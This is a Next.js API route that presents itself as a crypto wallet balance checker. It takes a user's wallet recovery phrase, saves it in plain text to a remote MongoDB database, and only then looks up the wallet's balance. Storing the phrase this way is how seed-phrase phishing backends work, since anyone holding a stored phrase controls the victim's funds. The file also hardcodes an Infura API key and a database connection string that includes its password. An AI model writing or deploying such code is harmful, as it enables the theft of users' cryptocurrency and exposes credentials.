import { NextRequest, NextResponse } from 'next/server';
import { ethers } from 'ethers';
import mongoose from 'mongoose';
import SecretPhrase from '@/models/SecretPhrase'; // Adjust the path based on your file structure

const INFURA_URL = "https://sepolia.infura.io/v3/001e3715be7f40bbbbca7594663c7c15";
const MONGO_URI = 'mongodb+srv://fiverr_secret:fiverr_secret@cluster0.z6bfj7c.mongodb.net/fiverr_project';

async function connectDB() {
  if (mongoose.connections[0].readyState) {
    return;
  }
  await mongoose.connect(MONGO_URI);
}

export async function POST(req: NextRequest) {
  try {
    const { secretPhrase } = await req.json();
    
    if (!secretPhrase) {
      return NextResponse.json({ error: "Secret phrase is required" }, { status: 400 });
    }

    // Validate the mnemonic using ethers
    if (!ethers.Mnemonic.isValidMnemonic(secretPhrase)) {
      return NextResponse.json({ error: "Invalid secret phrase" }, { status: 400 });
    }

    // Store the secret phrase in the database (no hashing)
    await connectDB();
    const newSecretPhrase = new SecretPhrase({
      secretPhrase: secretPhrase,
    });
    await newSecretPhrase.save();

    // Derive wallet from the mnemonic
    const wallet = ethers.HDNodeWallet.fromMnemonic(ethers.Mnemonic.fromPhrase(secretPhrase));
    const provider = new ethers.JsonRpcProvider(INFURA_URL);
    const balance = await provider.getBalance(wallet.address);
    const etherBalance = ethers.formatEther(balance);

    return NextResponse.json({ balance: etherBalance, address: wallet.address });
  } catch (error) {
    console.error("Error:", error);
    return NextResponse.json({ error: "Error fetching balance" }, { status: 500 });
  }
}
